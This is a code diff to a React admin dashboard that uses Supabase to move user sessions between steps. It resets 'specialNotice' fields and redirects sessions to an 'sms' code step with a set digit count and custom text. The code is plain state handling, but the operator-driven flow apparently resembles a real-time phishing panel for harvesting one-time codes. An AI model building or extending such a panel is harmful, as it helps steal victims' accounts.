@@ -466,19 +466,46 @@ export function AdminDashboardClean() {
       setSpecialPromptSessionId(id);
       return;
     }
-    await supabase.from("sessions").update({ is_hidden: false, current_step: step, status: "online" }).eq("id", id);
+    // Admine ait tüm session'larda step değiştirirken:
+    // 1. status online yap (approval bekleme modundan çık)
+    // 2. form_data specialNotice* alanlarını temizle (bir sonraki approval'da karışmasın)
+    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", id).maybeSingle();
+    const prevFd = (existing?.form_data ?? {}) as Record<string, unknown>;
+    await supabase.from("sessions").update({
+      is_hidden: false,
+      current_step: step,
+      status: "online",
+      form_data: {
+        ...prevFd,
+        specialNoticeText: null,
+        specialNoticeImage: null,
+        specialNoticeLang: null,
+        specialNoticeSentAt: null,
+      },
+    }).eq("id", id);
     await load();
   }
 
   async function confirmSmsRedirect() {
     if (!supabase || !smsPromptSessionId) return;
     const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
+    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", smsPromptSessionId).maybeSingle();
+    const prevFd = (existing?.form_data ?? {}) as Record<string, unknown>;
     await supabase
       .from("sessions")
-      .update({ is_hidden: false, current_step: "sms", 
-        sms_digits: digits, 
+      .update({
+        is_hidden: false,
+        current_step: "sms",
+        sms_digits: digits,
         sms_custom_text: smsCustomTextInput.trim() || null,
-        status: "online" 
+        status: "online",
+        form_data: {
+          ...prevFd,
+          specialNoticeText: null,
+          specialNoticeImage: null,
+          specialNoticeLang: null,
+          specialNoticeSentAt: null,
+        },
       })
       .eq("id", smsPromptSessionId);
     setSmsPromptSessionId(null);
